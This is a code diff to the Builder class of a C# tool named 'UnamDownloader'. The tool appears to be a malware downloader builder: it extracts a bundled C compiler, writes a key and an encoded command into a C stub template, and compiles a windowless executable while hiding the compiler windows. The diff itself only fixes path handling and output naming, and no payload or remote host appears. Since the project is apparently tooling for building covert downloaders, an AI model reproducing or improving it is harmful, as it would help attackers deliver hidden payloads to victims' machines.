@@ -7,6 +7,7 @@ using System.Diagnostics;
 using System.IO;
 using System.IO.Compression;
 using System.Linq;
+using System.Runtime.InteropServices;
 using System.Text;
 using System.Windows.Forms;
 
@@ -17,6 +18,8 @@ namespace UnamDownloader
         private static Random random = new Random();
         public Vanity vanity = new Vanity();
 
+        public static int MAX_PATH = 255;
+
         public Builder()
         {
             InitializeComponent();
@@ -25,9 +28,15 @@ namespace UnamDownloader
         public void NativeCompiler(string savePath)
         {
             string currentDirectory = Path.GetDirectoryName(savePath);
-            string filename = Path.GetFileNameWithoutExtension(savePath) + ".c";
-
             string compilerDirectory = Path.Combine(currentDirectory, "Compiler");
+            string filename = Path.GetFileName(savePath);
+
+            if (compilerDirectory.Length > MAX_PATH)
+            {
+                MessageBox.Show(string.Format("Error: Path \"{0}\" is longer than the max allowed filepath length of {1} characters. Please choose another shorter filepath to save the build in.", compilerDirectory, MAX_PATH));
+                return;
+            }
+
             if (!Directory.Exists(compilerDirectory))
             {
                 using (ZipArchive archive = new ZipArchive(new MemoryStream(Properties.Resources.tinycc)))
@@ -39,6 +48,8 @@ namespace UnamDownloader
                     archive.ExtractToDirectory(compilerDirectory);
                 }
             }
+
+            string compilerDirectoryShort = ShortPath(compilerDirectory);
 
             StringBuilder sb = new StringBuilder(Properties.Resources.Program1);
 
@@ -73,8 +84,8 @@ namespace UnamDownloader
 
                 Process.Start(new ProcessStartInfo
                 {
-                    FileName = Path.Combine(compilerDirectory, "MinGW64\\bin\\windres.exe"),
-                    Arguments = "--input resource.rc --output resource.o -O coff -F pe-i386 " + defs,
+                    FileName = "cmd",
+                    Arguments = string.Format("cmd /c \"{0}\" --input resource.rc --output resource.o -O coff -F pe-i386 {1}", compilerDirectoryShort + "\\MinGW64\\bin\\windres.exe", defs),
                     WorkingDirectory = currentDirectory,
                     WindowStyle = ProcessWindowStyle.Hidden
                 }).WaitForExit();
@@ -88,17 +99,18 @@ namespace UnamDownloader
             sb.Replace("#LENGTH", command.Length.ToString());
             sb.Replace("#KEY", key);
 
-            System.IO.File.WriteAllText(Path.Combine(currentDirectory, filename), sb.ToString());
+            System.IO.File.WriteAllText(Path.Combine(currentDirectory, "program.c"), sb.ToString());
             Process.Start(new ProcessStartInfo
             {
-                FileName = Path.Combine(compilerDirectory, "tinycc\\tcc.exe"),
-                Arguments = "-Wall -Wl,-subsystem=windows \"" + filename + "\" " + (buildResource ? "resource.o" : "") + " -luser32 -m32",
+                FileName = "cmd",
+                Arguments = string.Format("cmd /c \"{0}\" -Wall -Wl,-subsystem=windows program.c {1} -luser32 -m32", compilerDirectoryShort + "\\tinycc\\tcc.exe", buildResource ? "resource.o" : ""),
                 WorkingDirectory = currentDirectory,
                 WindowStyle = ProcessWindowStyle.Hidden
             }).WaitForExit();
 
             System.IO.File.Delete(Path.Combine(currentDirectory, "resource.o"));
-            System.IO.File.Delete(Path.Combine(currentDirectory, filename));
+            System.IO.File.Delete(Path.Combine(currentDirectory, "program.c"));
+            System.IO.File.Move(Path.Combine(currentDirectory, "program.exe"), Path.Combine(currentDirectory, filename));
         }
 
         public string CreateCommand()
@@ -163,6 +175,16 @@ namespace UnamDownloader
                 }
             }
             return literal.ToString();
+        }
+
+        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
+        public static extern int GetShortPathName([MarshalAs(UnmanagedType.LPWStr)]string path, [MarshalAs(UnmanagedType.LPWStr)]StringBuilder shortPath, int shortPathLength);
+
+        private static string ShortPath(string path)
+        {
+            var shortPath = new StringBuilder(MAX_PATH);
+            GetShortPathName(path, shortPath, MAX_PATH);
+            return shortPath.ToString();
         }
 
         public string SaveDialog(string filter)
